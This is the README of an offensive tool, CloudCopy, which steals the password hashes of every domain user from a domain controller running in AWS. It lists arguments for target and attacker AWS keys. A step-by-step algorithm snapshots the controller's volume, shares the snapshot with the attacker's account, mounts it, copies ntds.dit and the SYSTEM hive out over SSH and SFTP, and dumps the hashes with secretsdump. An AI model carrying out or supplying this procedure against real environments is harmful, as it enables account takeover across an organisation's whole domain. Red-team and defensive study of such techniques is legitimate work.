# CloudCopy
This script implements a cloud version of the Shadow Copy attack against domain controllers running in AWS. Any AWS user possessing the EC2:CreateSnapshot permission can steal the hashes of all domain users by creating a snapshot of the Domain Controller mounting it to an instance they control and exporting the NTDS.dit and SYSTEM registry hive file for use with Impacket's secretsdump project.

# Usage
```
usage: CloudCopy.py [-h]
                    youraccountid yourinstancekey localkeypath targetaccesskey
                    targetsecretkey youracccesskey yoursecretkey

positional arguments:
  youraccountid    your account id for stealing snapshot
  yourinstancekey  your private key name (without .pem) for accessing the
                   instance
  localkeypath     local path to key for ssh'ing to new instance
  targetaccesskey  target AWS Access Key for making snapshot
  targetsecretkey  target AWS Secret Key for making snapshot
  youracccesskey   your AWS Access Key for making instance
  yoursecretkey    your AWS Secret Key for making instance

optional arguments:
  -h, --help       show this help message and exit

```

# CloudCopy Algorithm
1.  Load AWS CLI with Target Creds
2.  Run "Describe-Instances" and show in list to select
3.  Run "Create-Snapshot" on volume from selected instance
4.  Run "modify-snapshot-attribute" on new snapshot to set "createVolumePermission" to attacker AWS Account
5.  Load AWS CLI with Attacker Creds
6.  Run "run-instance" command to create new linux ec2 with our stolen snapshot
7.  Ssh run "sudo mkdir /windows"
8.  Ssh run "sudo mount /dev/xvdf1 /windows/"
9.  Ssh run "sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"
10. Ssh run "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"
11. Ssh run "sudo chown ec2-user:ec2-user /home/ec2-user/*"
12. SFTP get "/home/ec2-user/SYSTEM ./SYSTEM"
13. SFTP get "/home/ec2-user/ntds.dit ./ntds.dit"
14. locally run "secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets #expects secretsdump to be on path
